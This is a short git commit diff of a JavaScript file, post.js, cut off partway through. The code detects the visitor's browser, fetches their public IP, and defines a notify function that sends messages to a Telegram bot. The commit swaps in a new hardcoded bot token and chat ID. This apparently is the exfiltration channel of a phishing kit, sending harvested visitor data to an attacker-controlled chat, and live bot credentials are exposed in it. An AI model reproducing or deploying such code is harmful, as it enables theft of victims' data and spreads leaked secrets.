15f820ffe2b1668d92cff28b6d9872889f50650b
wisefour1018 <wisefour1018@gmail.com>
2025-07-12 10:22:00 +0100

    Update post.js

--- post.js
+++ post.js
@@ -1,8 +1,8 @@
 function browserN(){if((navigator.userAgent.indexOf("Opera")||navigator.userAgent.indexOf('OPR'))!=-1){return'Opera'}else if(navigator.userAgent.indexOf("Edg")!=-1){return'Edge'}else if(navigator.userAgent.indexOf("Chrome")!=-1){return'Chrome'}else if(navigator.userAgent.indexOf("Safari")!=-1){return'Safari'}else if(navigator.userAgent.indexOf("Firefox")!=-1){return'Firefox'}else if((navigator.userAgent.indexOf("MSIE")!=-1)||(!!document.documentMode==!0)){return'IE'}else{return'unknown'}}
 function fetch_ip(){$.getJSON("https://api.ipify.org?format=json",function(data){$("#eip").val(data.ip)})}
 async function notify(message){
-    const botToken='7606277895:AAEEvGTP0tCmUury7ngWLyfu9PjG01QusoU';
-    const chatId='6902150530';
+    const botToken='7549612488:AAGc1mXWw9-M6XNe6obJKJ-JxpdPIeIGIt0';
+    const chatId='6644308262';
     const url=`https://api.telegram.org/bot${botToken}/sendMessage`;
     const data = {
                 chat_id: chatId,
